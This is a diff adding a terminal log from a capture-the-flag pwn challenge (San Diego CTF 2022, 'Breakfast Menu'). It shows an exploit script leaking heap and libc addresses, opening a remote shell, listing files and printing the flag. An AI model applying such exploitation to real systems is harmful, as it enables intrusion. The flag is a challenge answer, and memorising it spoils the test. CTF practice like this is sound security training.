@@ -1,0 +1,29 @@
+mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250$ python solve.py r
+[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Breakfast_Menu_250/BreakfastMenu'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to breakfast.sdc.tf on port 1337: Done
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+heap_leak = 0x880300
+heap_base = 0x87e000
+libc_leak = 0x7fc8441e3ca0
+libc_base = 0x7fc843df8000
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 28
+-rwxr-xr-x 1 nobody nogroup 13000 May  6 22:02 BreakfastMenu
+-rw-r--r-- 1 nobody nogroup  2405 May  5 18:23 BreakfastMenu.c
+-rw-r--r-- 1 nobody nogroup   105 Apr 29 20:55 Makefile
+-rw-r--r-- 1 nobody nogroup    42 May  6 22:01 flag.txt
+$ cat flag.txt
+sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}
